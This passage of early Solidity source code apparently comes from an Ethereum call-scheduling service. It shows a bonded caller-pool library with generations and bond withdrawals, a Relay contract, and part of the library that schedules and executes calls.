return nextGeneration.id;\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Returns the first generation id that fully contains the block window provided.\r\r\n        \/\/\/ @param self The pool to operate on.\r\r\n        \/\/\/ @param leftBound The left bound for the block window (inclusive)\r\r\n        \/\/\/ @param rightBound The right bound for the block window (inclusive)\r\r\n        function getGenerationForWindow(Pool storage self, uint leftBound, uint rightBound) constant returns (uint) {\r\r\n            \/\/ TODO: tests\r\r\n                var left = GroveLib.query(self.generationStart, \"<=\", int(leftBound));\r\r\n\r\r\n                if (left != 0x0) {\r\r\n                    Generation memory leftCandidate = self.generations[StringLib.bytesToUInt(left)];\r\r\n                    if (leftCandidate.startAt <= leftBound && (leftCandidate.endAt >= rightBound || leftCandidate.endAt == 0)) {\r\r\n                        return leftCandidate.id;\r\r\n                    }\r\r\n                }\r\r\n\r\r\n                var right = GroveLib.query(self.generationEnd, \">=\", int(rightBound));\r\r\n                if (right != 0x0) {\r\r\n                    Generation memory rightCandidate = self.generations[StringLib.bytesToUInt(right)];\r\r\n                    if (rightCandidate.startAt <= leftBound && (rightCandidate.endAt >= rightBound || rightCandidate.endAt == 0)) {\r\r\n                        return rightCandidate.id;\r\r\n                    }\r\r\n                }\r\r\n\r\r\n                return 0;\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Returns the first generation in the future that has not yet started.\r\r\n        \/\/\/ @param self The pool to operate on.\r\r\n        function getNextGenerationId(Pool storage self) constant returns (uint) {\r\r\n            \/\/ TODO: tests\r\r\n                var next = GroveLib.query(self.generationStart, \">\", int(block.number));\r\r\n                if (next == 0x0) {\r\r\n                    return 0;\r\r\n                }\r\r\n                return StringLib.bytesToUInt(next);\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Returns the first generation that is currently active.\r\r\n        \/\/\/ @param self The pool to operate on.\r\r\n        function getCurrentGenerationId(Pool storage self) constant returns (uint) {\r\r\n            \/\/ TODO: tests\r\r\n                var next = GroveLib.query(self.generationEnd, \">\", int(block.number));\r\r\n                if (next != 0x0) {\r\r\n                    return StringLib.bytesToUInt(next);\r\r\n                }\r\r\n\r\r\n                next = GroveLib.query(self.generationStart, \"<=\", int(block.number));\r\r\n                if (next != 0x0) {\r\r\n                    return StringLib.bytesToUInt(next);\r\r\n                }\r\r\n                return 0;\r\r\n        }\r\r\n\r\r\n        \/*\r\r\n         *  Pool membership API\r\r\n         *\/\r\r\n        \/\/\/ @dev Returns a boolean for whether the given address is in the given generation.\r\r\n        \/\/\/ @param self The pool to operate on.\r\r\n        \/\/\/ @param resourceAddress The address to check membership of\r\r\n        \/\/\/ @param generationId The id of the generation to check.\r\r\n        function isInGeneration(Pool storage self, address resourceAddress, uint generationId) constant returns (bool) {\r\r\n            \/\/ TODO: tests\r\r\n            if (generationId == 0) {\r\r\n                return false;\r\r\n            }\r\r\n            Generation memory generation = self.generations[generationId];\r\r\n            for (uint i = 0; i < generation.members.length; i++) {\r\r\n                if (generation.members[i] == resourceAddress) {\r\r\n                    return true;\r\r\n                }\r\r\n            }\r\r\n            return false;\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Returns a boolean for whether the given address is in the current generation.\r\r\n        \/\/\/ @param self The pool to operate on.\r\r\n        \/\/\/ @param resourceAddress The address to check membership of\r\r\n        function isInCurrentGeneration(Pool storage self, address resourceAddress) constant returns (bool) {\r\r\n            \/\/ TODO: tests\r\r\n            return isInGeneration(self, resourceAddress, getCurrentGenerationId(self));\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Returns a boolean for whether the given address is in the next queued generation.\r\r\n        \/\/\/ @param self The pool to operate on.\r\r\n        \/\/\/ @param resourceAddress The address to check membership of\r\r\n        function isInNextGeneration(Pool storage self, address resourceAddress) constant returns (bool) {\r\r\n            \/\/ TODO: tests\r\r\n            return isInGeneration(self, resourceAddress, getNextGenerationId(self));\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Returns a boolean for whether the given address is in either the current generation or the next queued generation.\r\r\n        \/\/\/ @param self The pool to operate on.\r\r\n        \/\/\/ @param resourceAddress The address to check membership of\r\r\n        function isInPool(Pool storage self, address resourceAddress) constant returns (bool) {\r\r\n            \/\/ TODO: tests\r\r\n            return (isInCurrentGeneration(self, resourceAddress) || isInNextGeneration(self, resourceAddress));\r\r\n        }\r\r\n\r\r\n        event _AddedToGeneration(address indexed resourceAddress, uint indexed generationId);\r\r\n        \/\/\/ @dev Function to expose the _AddedToGeneration event to contracts.\r\r\n        \/\/\/ @param resourceAddress The address that was added\r\r\n        \/\/\/ @param generationId The id of the generation.\r\r\n        function AddedToGeneration(address resourceAddress, uint generationId) public {\r\r\n                _AddedToGeneration(resourceAddress, generationId);\r\r\n        }\r\r\n\r\r\n        event _RemovedFromGeneration(address indexed resourceAddress, uint indexed generationId);\r\r\n        \/\/\/ @dev Function to expose the _AddedToGeneration event to contracts.\r\r\n        \/\/\/ @param resourceAddress The address that was removed.\r\r\n        \/\/\/ @param generationId The id of the generation.\r\r\n        function RemovedFromGeneration(address resourceAddress, uint generationId) public {\r\r\n                _RemovedFromGeneration(resourceAddress, generationId);\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Returns a boolean as to whether the provided address is allowed to enter the pool at this time.\r\r\n        \/\/\/ @param self The pool to operate on.\r\r\n        \/\/\/ @param resourceAddress The address in question\r\r\n        \/\/\/ @param minimumBond The minimum bond amount that should be required for entry.\r\r\n        function canEnterPool(Pool storage self, address resourceAddress, uint minimumBond) constant returns (bool) {\r\r\n            \/*\r\r\n             *  - bond\r\r\n             *  - pool is open\r\r\n             *  - not already in it.\r\r\n             *  - not already left it.\r\r\n             *\/\r\r\n            \/\/ TODO: tests\r\r\n            if (self.bonds[resourceAddress] < minimumBond) {\r\r\n                \/\/ Insufficient bond balance;\r\r\n                return false;\r\r\n            }\r\r\n\r\r\n            if (isInPool(self, resourceAddress)) {\r\r\n                \/\/ Already in the pool either in the next upcoming generation\r\r\n                \/\/ or the currently active generation.\r\r\n                return false;\r\r\n            }\r\r\n\r\r\n            var nextGenerationId = getNextGenerationId(self);\r\r\n            if (nextGenerationId != 0) {\r\r\n                var nextGeneration = self.generations[nextGenerationId];\r\r\n                if (block.number + self.freezePeriod >= nextGeneration.startAt) {\r\r\n                    \/\/ Next generation starts too soon.\r\r\n                    return false;\r\r\n                }\r\r\n            }\r\r\n\r\r\n            return true;\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Adds the address to pool by adding them to the next generation (as well as creating it if it doesn&#39;t exist).\r\r\n        \/\/\/ @param self The pool to operate on.\r\r\n        \/\/\/ @param resourceAddress The address to be added to the pool\r\r\n        \/\/\/ @param minimumBond The minimum bond amount that should be required for entry.\r\r\n        function enterPool(Pool storage self, address resourceAddress, uint minimumBond) public returns (uint) {\r\r\n            if (!canEnterPool(self, resourceAddress, minimumBond)) {\r\r\n                throw;\r\r\n            }\r\r\n            uint nextGenerationId = getNextGenerationId(self);\r\r\n            if (nextGenerationId == 0) {\r\r\n                \/\/ No next generation has formed yet so create it.\r\r\n                nextGenerationId = createNextGeneration(self);\r\r\n            }\r\r\n            Generation storage nextGeneration = self.generations[nextGenerationId];\r\r\n            \/\/ now add the new address.\r\r\n            nextGeneration.members.length += 1;\r\r\n            nextGeneration.members[nextGeneration.members.length - 1] = resourceAddress;\r\r\n            return nextGenerationId;\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Returns a boolean as to whether the provided address is allowed to exit the pool at this time.\r\r\n        \/\/\/ @param self The pool to operate on.\r\r\n        \/\/\/ @param resourceAddress The address in question\r\r\n        function canExitPool(Pool storage self, address resourceAddress) constant returns (bool) {\r\r\n            if (!isInCurrentGeneration(self, resourceAddress)) {\r\r\n                \/\/ Not in the pool.\r\r\n                return false;\r\r\n            }\r\r\n\r\r\n            uint nextGenerationId = getNextGenerationId(self);\r\r\n            if (nextGenerationId == 0) {\r\r\n                \/\/ Next generation hasn&#39;t been generated yet.\r\r\n                return true;\r\r\n            }\r\r\n\r\r\n            if (self.generations[nextGenerationId].startAt - self.freezePeriod <= block.number) {\r\r\n                \/\/ Next generation starts too soon.\r\r\n                return false;\r\r\n            }\r\r\n\r\r\n            \/\/ They can leave if they are still in the next generation.\r\r\n            \/\/ otherwise they have already left it.\r\r\n            return isInNextGeneration(self, resourceAddress);\r\r\n        }\r\r\n\r\r\n\r\r\n        \/\/\/ @dev Removes the address from the pool by removing them from the next generation (as well as creating it if it doesn&#39;t exist)\r\r\n        \/\/\/ @param self The pool to operate on.\r\r\n        \/\/\/ @param resourceAddress The address in question\r\r\n        function exitPool(Pool storage self, address resourceAddress) public returns (uint) {\r\r\n            if (!canExitPool(self, resourceAddress)) {\r\r\n                throw;\r\r\n            }\r\r\n            uint nextGenerationId = getNextGenerationId(self);\r\r\n            if (nextGenerationId == 0) {\r\r\n                \/\/ No next generation has formed yet so create it.\r\r\n                nextGenerationId = createNextGeneration(self);\r\r\n            }\r\r\n            \/\/ Remove them from the generation\r\r\n            removeFromGeneration(self, nextGenerationId, resourceAddress);\r\r\n            return nextGenerationId;\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Removes the address from a generation&#39;s members array. Returns boolean as to whether removal was successful.\r\r\n        \/\/\/ @param self The pool to operate on.\r\r\n        \/\/\/ @param generationId The id of the generation to operate on.\r\r\n        \/\/\/ @param resourceAddress The address to be removed.\r\r\n        function removeFromGeneration(Pool storage self, uint generationId, address resourceAddress) public returns (bool){\r\r\n            Generation storage generation = self.generations[generationId];\r\r\n            \/\/ now remove the address\r\r\n            for (uint i = 0; i < generation.members.length; i++) {\r\r\n                if (generation.members[i] == resourceAddress) {\r\r\n                    generation.members[i] = generation.members[generation.members.length - 1];\r\r\n                    generation.members.length -= 1;\r\r\n                    return true;\r\r\n                }\r\r\n            }\r\r\n            return false;\r\r\n        }\r\r\n\r\r\n        \/*\r\r\n         *  Bonding\r\r\n         *\/\r\r\n\r\r\n        \/\/\/ @dev Subtracts the amount from an account&#39;s bond balance.\r\r\n        \/\/\/ @param self The pool to operate on.\r\r\n        \/\/\/ @param resourceAddress The address of the account\r\r\n        \/\/\/ @param value The value to subtract.\r\r\n        function deductFromBond(Pool storage self, address resourceAddress, uint value) public {\r\r\n                \/*\r\r\n                 *  deduct funds from a bond value without risk of an\r\r\n                 *  underflow.\r\r\n                 *\/\r\r\n                if (value > self.bonds[resourceAddress]) {\r\r\n                        \/\/ Prevent Underflow.\r\r\n                        throw;\r\r\n                }\r\r\n                self.bonds[resourceAddress] -= value;\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Adds the amount to an account&#39;s bond balance.\r\r\n        \/\/\/ @param self The pool to operate on.\r\r\n        \/\/\/ @param resourceAddress The address of the account\r\r\n        \/\/\/ @param value The value to add.\r\r\n        function addToBond(Pool storage self, address resourceAddress, uint value) public {\r\r\n                \/*\r\r\n                 *  Add funds to a bond value without risk of an\r\r\n                 *  overflow.\r\r\n                 *\/\r\r\n                if (self.bonds[resourceAddress] + value < self.bonds[resourceAddress]) {\r\r\n                        \/\/ Prevent Overflow\r\r\n                        throw;\r\r\n                }\r\r\n                self.bonds[resourceAddress] += value;\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Withdraws a bond amount from an address&#39;s bond account, sending them the corresponding amount in ether.\r\r\n        \/\/\/ @param self The pool to operate on.\r\r\n        \/\/\/ @param resourceAddress The address of the account\r\r\n        \/\/\/ @param value The value to withdraw.\r\r\n        function withdrawBond(Pool storage self, address resourceAddress, uint value, uint minimumBond) public {\r\r\n                \/*\r\r\n                 *  Only if you are not in either of the current call pools.\r\r\n                 *\/\r\r\n                \/\/ Prevent underflow\r\r\n                if (value > self.bonds[resourceAddress]) {\r\r\n                        throw;\r\r\n                }\r\r\n\r\r\n                \/\/ Do a permissions check to be sure they can withdraw the\r\r\n                \/\/ funds.\r\r\n                if (isInPool(self, resourceAddress)) {\r\r\n                        if (self.bonds[resourceAddress] - value < minimumBond) {\r\r\n                            return;\r\r\n                        }\r\r\n                }\r\r\n\r\r\n                deductFromBond(self, resourceAddress, value);\r\r\n                if (!resourceAddress.send(value)) {\r\r\n                        \/\/ Potentially sending money to a contract that\r\r\n                        \/\/ has a fallback function.  So instead, try\r\r\n                        \/\/ tranferring the funds with the call api.\r\r\n                        if (!resourceAddress.call.gas(msg.gas).value(value)()) {\r\r\n                                \/\/ Revert the entire transaction.  No\r\r\n                                \/\/ need to destroy the funds.\r\r\n                                throw;\r\r\n                        }\r\r\n                }\r\r\n        }\r\r\n}\r\r\n\r\r\n\r\r\ncontract Relay {\r\r\n        address operator;\r\r\n\r\r\n        function Relay() {\r\r\n                operator = msg.sender;\r\r\n        }\r\r\n\r\r\n        function relayCall(address contractAddress, bytes4 abiSignature, bytes data) public returns (bool) {\r\r\n                if (msg.sender != operator) {\r\r\n                        throw;\r\r\n                }\r\r\n                return contractAddress.call(abiSignature, data);\r\r\n        }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\nlibrary ScheduledCallLib {\r\r\n    \/*\r\r\n     *  Address: 0x5c3623dcef2d5168dbe3e8cc538788cd8912d898\r\r\n     *\/\r\r\n    struct CallDatabase {\r\r\n        Relay unauthorizedRelay;\r\r\n        Relay authorizedRelay;\r\r\n\r\r\n        bytes32 lastCallKey;\r\r\n        bytes lastData;\r\r\n        uint lastDataLength;\r\r\n        bytes32 lastDataHash;\r\r\n\r\r\n        ResourcePoolLib.Pool callerPool;\r\r\n        GroveLib.Index callIndex;\r\r\n\r\r\n        AccountingLib.Bank gasBank;\r\r\n\r\r\n        mapping (bytes32 => Call) calls;\r\r\n        mapping (bytes32 => bytes) data_registry;\r\r\n\r\r\n        mapping (bytes32 => bool) accountAuthorizations;\r\r\n    }\r\r\n\r\r\n    struct Call {\r\r\n            address contractAddress;\r\r\n            address scheduledBy;\r\r\n            uint calledAtBlock;\r\r\n            uint targetBlock;\r\r\n            uint8 gracePeriod;\r\r\n            uint nonce;\r\r\n            uint baseGasPrice;\r\r\n            uint gasPrice;\r\r\n            uint gasUsed;\r\r\n            uint gasCost;\r\r\n            uint payout;\r\r\n            uint fee;\r\r\n            address executedBy;\r\r\n            bytes4 abiSignature;\r\r\n            bool isCancelled;\r\r\n            bool wasCalled;\r\r\n            bool wasSuccessful;\r\r\n            bytes32 dataHash;\r\r\n    }\r\r\n\r\r\n    \/\/ The author (Piper Merriam) address.\r\r\n    address constant owner = 0xd3cda913deb6f67967b99d67acdfa1712c293601;\r\r\n\r\r\n    \/*\r\r\n     *  Getter methods for `Call` information\r\r\n     *\/\r\r\n    function getCallContractAddress(CallDatabase storage self, bytes32 callKey) constant returns (address) {\r\r\n            return self.calls[callKey].contractAddress;\r\r\n    }\r\r\n\r\r\n    function getCallScheduledBy(CallDatabase storage self, bytes32 callKey) constant returns (address) {\r\r\n            return self.calls[callKey].scheduledBy;\r\r\n    }\r\r\n\r\r\n    function getCallCalledAtBlock(CallDatabase storage self, bytes32 callKey) constant returns (uint) {\r\r\n            return self.calls[callKey].calledAtBlock;\r\r\n    }\r\r\n\r\r\n    function getCallGracePeriod(CallDatabase storage self, bytes32 callKey) constant returns (uint) {\r\r\n            return self.calls[callKey].gracePeriod;\r\r\n    }\r\r\n\r\r\n    function getCallTargetBlock(CallDatabase storage self, bytes32 callKey) constant returns (uint) {\r\r\n            return self.calls[callKey].targetBlock;\r\r\n    }\r\r\n\r\r\n    function getCallBaseGasPrice(CallDatabase storage self, bytes32 callKey) constant returns (uint) {\r\r\n            return self.calls[callKey].baseGasPrice;\r\r\n    }\r\r\n\r\r\n    function getCallGasPrice(CallDatabase storage self, bytes32 callKey) constant returns (uint) {\r\r\n            return self.calls[callKey].gasPrice;\r\r\n    }\r\r\n\r\r\n    function getCallGasUsed(CallDatabase storage self, bytes32 callKey) constant returns (uint) {\r\r\n            return self.calls[callKey].gasUsed;\r\r\n    }\r\r\n\r\r\n    function getCallABISignature(CallDatabase storage self, bytes32 callKey) constant returns (bytes4) {\r\r\n            return self.calls[callKey].abiSignature;\r\r\n    }\r\r\n\r\r\n    function checkIfCalled(CallDatabase storage self, bytes32 callKey) constant returns (bool) {\r\r\n            return self.calls[callKey].wasCalled;\r\r\n    }\r\r\n\r\r\n    function checkIfSuccess(CallDatabase storage self, bytes32 callKey) constant returns (bool) {\r\r\n            return self.calls[callKey].wasSuccessful;\r\r\n    }\r\r\n\r\r\n    function checkIfCancelled(CallDatabase storage self, bytes32 callKey) constant returns (bool) {\r\r\n            return self.calls[callKey].isCancelled;\r\r\n    }\r\r\n\r\r\n    function getCallDataHash(CallDatabase storage self, bytes32 callKey) constant returns (bytes32) {\r\r\n            return self.calls[callKey].dataHash;\r\r\n    }\r\r\n\r\r\n    function getCallPayout(CallDatabase storage self, bytes32 callKey) constant returns (uint) {\r\r\n            return self.calls[callKey].payout;\r\r\n    }\r\r\n\r\r\n    function getCallFee(CallDatabase storage self, bytes32 callKey) constant returns (uint) {\r\r\n            return self.calls[callKey].fee;\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n     *  Scheduling Authorization API\r\r\n     *\/\r\r\n\r\r\n    function addAuthorization(CallDatabase storage self, address schedulerAddress, address contractAddress) public {\r\r\n            self.accountAuthorizations[sha3(schedulerAddress, contractAddress)] = true;\r\r\n    }\r\r\n\r\r\n    function removeAuthorization(CallDatabase storage self, address schedulerAddress, address contractAddress) public {\r\r\n            self.accountAuthorizations[sha3(schedulerAddress, contractAddress)] = false;\r\r\n    }\r\r\n\r\r\n    function checkAuthorization(CallDatabase storage self, address schedulerAddress, address contractAddress) constant returns (bool) {\r\r\n            return self.accountAuthorizations[sha3(schedulerAddress, contractAddress)];\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n     *  Data Registry API\r\r\n     *\/\r\r\n    function getCallData(CallDatabase storage self, bytes32 callKey) constant returns (bytes) {\r\r\n            return self.data_registry[self.calls[callKey].dataHash];\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n     *  API used by Alarm service\r\r\n     *\/\r\r\n    \/\/ The number of blocks that each caller in the pool has to complete their\r\r\n    \/\/ call.\r\r\n    uint constant CALL_WINDOW_SIZE = 16;\r\r\n\r\r\n    function getGenerationIdForCall(CallDatabase storage self, bytes32 callKey) constant returns (uint) {\r\r\n            Call call = self.calls[callKey];\r\r\n            return ResourcePoolLib.getGenerationForWindow(self.callerPool, call.targetBlock, call.targetBlock + call.gracePeriod);\r\r\n    }\r\r\n\r\r\n    function getDesignatedCaller(CallDatabase storage self, bytes32 callKey, uint blockNumber) constant returns (address) {\r\r\n            \/*\r\r\n             *  Returns the caller from the current call pool who is\r\r\n             *  designated as the executor of this call.\r\r\n             *\/\r\r\n            Call call = self.calls[callKey];\r\r\n            if (blockNumber < call.targetBlock || blockNumber > call.targetBlock + call.gracePeriod) {\r\r\n                    \/\/ blockNumber not within call window.\r\r\n                    return 0x0;\r\r\n            }\r\r\n\r\r\n            \/\/ Check if we are in free-for-all window.\r\r\n            uint numWindows = call.gracePeriod \/ CALL_WINDOW_SIZE;\r\r\n            uint blockWindow = (blockNumber - call.targetBlock) \/ CALL_WINDOW_SIZE;\r\r\n\r\r\n            if (blockWindow + 2 > numWindows) {\r\r\n                    \/\/ We are within the free-for-all period.\r\r\n                    return 0x0;\r\r\n            }\r\r\n\r\r\n            \/\/ Lookup the pool that full contains the call window for this\r\r\n            \/\/ call.\r\r\n            uint generationId = ResourcePoolLib.getGenerationForWindow(self.callerPool, call.targetBlock, call.targetBlock + call.gracePeriod);\r\r\n            if (generationId == 0) {\r\r\n                    \/\/ No pool currently in operation.\r\r\n                    return 0x0;\r\r\n            }\r\r\n            var generation = self.callerPool.generations[generationId];\r\r\n\r\r\n            uint offset = uint(callKey) % generation.members.length;\r\r\n            return generation.members[(offset + blockWindow) % generation.members.length];\r\r\n    }\r\r\n\r\r\n    event _AwardedMissedBlockBonus(address indexed fromCaller, address indexed toCaller, uint indexed generationId, bytes32 callKey, uint blockNumber, uint bonusAmount);\r\r\n    function AwardedMissedBlockBonus(address fromCaller, address toCaller, uint generationId, bytes32 callKey, uint blockNumber, uint bonusAmount) public {\r\r\n        _AwardedMissedBlockBonus(fromCaller, toCaller, generationId, callKey, blockNumber, bonusAmount);\r\r\n    }\r\r\n\r\r\n    function getMinimumBond() constant returns (uint) {\r\r\n            return tx.gasprice * block.gaslimit;\r\r\n    }\r\r\n\r\r\n    function doBondBonusTransfer(CallDatabase storage self, address fromCaller, address toCaller) internal returns (uint) {\r\r\n            uint bonusAmount = getMinimumBond();\r\r\n            uint bondBalance = self.callerPool.bonds[fromCaller];\r\r\n\r\r\n            \/\/ If the bond balance is lower than the award\r\r\n            \/\/ balance, then adjust the reward amount to\r\r\n            \/\/ match the bond balance.\r\r\n            if (bonusAmount > bondBalance) {\r\r\n                    bonusAmount = bondBalance;\r\r\n            }\r\r\n\r\r\n            \/\/ Transfer the funds fromCaller => toCaller\r\r\n            ResourcePoolLib.deductFromBond(self.callerPool, fromCaller, bonusAmount);\r\r\n            ResourcePoolLib.addToBond(self.callerPool, toCaller, bonusAmount);\r\r\n\r\r\n            return bonusAmount;\r\r\n    }\r\r\n\r\r\n    function awardMissedBlockBonus(CallDatabase storage self, address toCaller, bytes32 callKey) public {\r\r\n            var call = self.calls[callKey];\r\r\n\r\r\n            var generation = self.callerPool.generations[ResourcePoolLib.getGenerationForWindow(self.callerPool, call.targetBlock, call.targetBlock + call.gracePeriod)];\r\r\n            uint i;\r\r\n            uint bonusAmount;\r\r\n            address fromCaller;\r\r\n\r\r\n            uint numWindows = call.gracePeriod \/ CALL_WINDOW_SIZE;\r\r\n            uint blockWindow = (block.number - call.targetBlock) \/ CALL_WINDOW_SIZE;\r\r\n\r\r\n            \/\/ Check if we are within the free-for-all period.  If so, we\r\r\n            \/\/ award from all pool members.\r\r\n            if (blockWindow + 2 > numWindows) {\r\r\n                    address firstCaller = getDesignatedCaller(self, callKey, call.targetBlock);\r\r\n                    for (i = call.targetBlock; i <= call.targetBlock + call.gracePeriod; i += CALL_WINDOW_SIZE) {\r\r\n                            fromCaller = getDesignatedCaller(self, callKey, i);\r\r\n                            if (fromCaller == firstCaller && i != call.targetBlock) {\r\r\n                                    \/\/ We have already gone through all of\r\r\n                                    \/\/ the pool callers so we should break\r\r\n                                    \/\/ out of the loop.\r\r\n                                    break;\r\r\n                            }\r\r\n                            if (fromCaller == toCaller) {\r\r\n                                    continue;\r\r\n                            }\r\r\n                            bonusAmount = doBondBonusTransfer(self, fromCaller, toCaller);\r\r\n\r\r\n                            \/\/ Log the bonus was awarded.\r\r\n                            AwardedMissedBlockBonus(fromCaller, toCaller, generation.id, callKey, block.number, bonusAmount);\r\r\n                    }\r\r\n                    return;\r\r\n            }\r\r\n\r\r\n            \/\/ Special case for single member and empty pools\r\r\n            if (generation.members.length < 2) {\r\r\n                    return;\r\r\n            }\r\r\n\r\r\n            \/\/ Otherwise the award comes from the previous caller.\r\r\n            for (i = 0; i < generation.members.length; i++) {\r\r\n                    \/\/ Find where the member is in the pool and\r\r\n                    \/\/ award from the previous pool members bond.\r\r\n                    if (generation.members[i] == toCaller) {\r\r\n                            fromCaller = generation.members[(i + generation.members.length - 1) % generation.members.length];\r\r\n\r\r\n                            bonusAmount = doBondBonusTransfer(self, fromCaller, toCaller);\r\r\n\r\r\n                            \/\/ Log the bonus was awarded.\r\r\n                            AwardedMissedBlockBonus(fromCaller, toCaller, generation.id, callKey, block.number, bonusAmount);\r\r\n\r\r\n                            \/\/ Remove the caller from the next pool.\r\r\n                            if (ResourcePoolLib.getNextGenerationId(self.callerPool) == 0) {\r\r\n                                    \/\/ This is the first address to modify the\r\r\n                                    \/\/ current pool so we need to setup the next\r\r\n                                    \/\/ pool.\r\r\n                                    ResourcePoolLib.createNextGeneration(self.callerPool);\r\r\n                            }\r\r\n                            ResourcePoolLib.removeFromGeneration(self.callerPool, ResourcePoolLib.getNextGenerationId(self.callerPool), fromCaller);\r\r\n                            return;\r\r\n                    }\r\r\n            }\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n     *  Data registration API\r\r\n     *\/\r\r\n    event _DataRegistered(bytes32 indexed dataHash);\r\r\n    function DataRegistered(bytes32 dataHash) constant {\r\r\n        _DataRegistered(dataHash);\r\r\n    }\r\r\n\r\r\n    function registerData(CallDatabase storage self, bytes data) public {\r\r\n            self.lastData.length = data.length - 4;\r\r\n            if (data.length > 4) {\r\r\n                    for (uint i = 0; i < self.lastData.length; i++) {\r\r\n                            self.lastData[i] = data[i + 4];\r\r\n                    }\r\r\n            }\r\r\n            self.data_registry[sha3(self.lastData)] = self.lastData;\r\r\n            self.lastDataHash = sha3(self.lastData);\r\r\n            self.lastDataLength = self.lastData.length;\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n     *  Call execution API\r\r\n     *\/\r\r\n    \/\/ This number represents the constant gas cost of the addition\r\r\n    \/\/ operations that occur in `doCall` that cannot be tracked with\r\r\n    \/\/ msg.gas.\r\r\n    uint constant EXTRA_CALL_GAS = 153321;\r\r\n\r\r\n    \/\/ This number represents the overall overhead involved in executing a\r\r\n    \/\/ scheduled call.\r\r\n    uint constant CALL_OVERHEAD = 120104;\r\r\n\r\r\n    event _CallExecuted(address indexed executedBy, bytes32 indexed callKey);\r\r\n    function CallExecuted(address executedBy, bytes32 callKey) public {\r\r\n        _CallExecuted(executedBy, callKey);\r\r\n    }\r\r\n    event _CallAborted(address indexed executedBy, bytes32 indexed callKey, bytes18 reason);\r\r\n    function CallAborted(address executedBy, bytes32 callKey, bytes18 reason) public {\r\r\n        _CallAborted(executedBy, callKey, reason);\r\r\n    }\r\r\n\r\r\n    function doCall(CallDatabase storage self, bytes32 callKey, address msgSender) public {\r\r\n            uint gasBefore = msg.gas;\r\r\n\r\r\n            Call storage call = self.calls[callKey];\r\r\n\r\r\n            if (call.wasCalled) {\r\r\n                    \/\/ The call has already been executed so don&#39;t do it again.\r\r\n                    _CallAborted(msg.sender, callKey, \"ALREADY CALLED\");\r\r\n                    return;\r\r\n            }\r\r\n\r\r\n            if (call.isCancelled) {\r\r\n                    \/\/ The call was cancelled so don&#39;t execute it.\r\r\n                    _CallAborted(msg.sender, callKey, \"CANCELLED\");\r\r\n                    return;\r\r\n            }\r\r\n\r\r\n            if (call.contractAddress == 0x0) {\r\r\n                    \/\/ This call key doesnt map to a registered call.\r\r\n                    _CallAborted(msg.sender, callKey, \"UNKNOWN\");\r\r\n                    return;\r\r\n            }\r\r\n\r\r\n            if (block.number < call.targetBlock) {\r\r\n                    \/\/ Target block hasnt happened yet.\r\r\n                    _CallAborted(msg.sender, callKey, \"TOO EARLY\");\r\r\n                    return;\r\r\n            }\r\r\n\r\r\n            if (block.number > call.targetBlock + call.gracePeriod) {\r\r\n                    \/\/ The blockchain has advanced passed the period where\r\r\n                    \/\/ it was allowed to be called.\r\r\n                    _CallAborted(msg.sender, callKey, \"TOO LATE\");\r\r\n                    return;\r\r\n            }\r\r\n\r\r\n            uint heldBalance = getCallMaxCost(self, callKey);\r\r\n\r\r\n            if (self.gasBank.accountBalances[call.scheduledBy] < heldBalance) {\r\r\n                    \/\/ The scheduledBy&#39;s account balance is less than the\r\r\n                    \/\/ current gasLimit and thus potentiall can&#39;t pay for\r\r\n                    \/\/ the call.\r\r\n\r\r\n                    \/\/ Mark it as called since it was.\r\r\n                    call.wasCalled = true;\r\r\n                    \r\r\n                    \/\/ Log it.\r\r\n                    _CallAborted(msg.sender, callKey, \"INSUFFICIENT_FUNDS\");\r\r\n                    return;\r\r\n            }\r\r\n\r\r\n            \/\/ Check if this caller is allowed to execute the call.\r\r\n            if (self.callerPool.generations[ResourcePoolLib.getCurrentGenerationId(self.callerPool)].members.length > 0) {\r\r\n                    address designatedCaller = getDesignatedCaller(self, callKey, block.number);\r\r\n                    if (designatedCaller != 0x0 && designatedCaller != msgSender) {\r\r\n                            \/\/ This call was reserved for someone from the\r\r\n                            \/\/ bonded pool of callers and can only be\r\r\n                            \/\/ called by them during this block window.\r\r\n                            _CallAborted(msg.sender, callKey, \"WRONG_CALLER\");\r\r\n                            return;\r\r\n                    }\r\r\n\r\r\n                    uint blockWindow = (block.number - call.targetBlock) \/ CALL_WINDOW_SIZE;\r\r\n                    if (blockWindow > 0) {\r\r\n                            \/\/ Someone missed their call so this caller\r\r\n                            \/\/ gets to claim their bond for picking up\r\r\n                            \/\/ their slack.\r\r\n                            awardMissedBlockBonus(self, msgSender, callKey);\r\r\n                    }\r\r\n            }\r\r\n\r\r\n            \/\/ Log metadata about the call.\r\r\n            call.gasPrice = tx.gasprice;\r\r\n            call.executedBy = msgSender;\r\r\n            call.calledAtBlock = block.number;\r\r\n\r\r\n            \/\/ Fetch the call data\r\r\n            var data = self.data_registry[call.dataHash];\r\r\n\r\r\n            \/\/ During the call, we need to put enough funds to pay for the\r\r\n            \/\/ call on hold to ensure they are available to pay the caller.\r\r\n            AccountingLib.withdraw(self.gasBank, call.scheduledBy, heldBalance);\r\r\n\r\r\n            \/\/ Mark whether the function call was successful.\r\r\n            if (checkAuthorization(self, call.scheduledBy, call.contractAddress)) {\r\r\n                    call.wasSuccessful = self.authorizedRelay.relayCall.gas(msg.gas - CALL_OVERHEAD)(call.contractAddress, call.abiSignature, data);\r\r\n            }\r\r\n            else {\r\r\n                    call.wasSuccessful = self.unauthorizedRelay.relayCall.gas(msg.gas - CALL_OVERHEAD)(call.contractAddress, call.abiSignature, data);\r\r\n            }\r\r\n\r\r\n            \/\/ Add the held funds back into the scheduler&#39;s account.\r\r\n            AccountingLib.deposit(self.gasBank, call.scheduledBy, heldBalance);\r\r\n\r\r\n            \/\/ Mark the call as having been executed.\r\r\n            call.wasCalled = true;\r\r\n\r\r\n            \/\/ 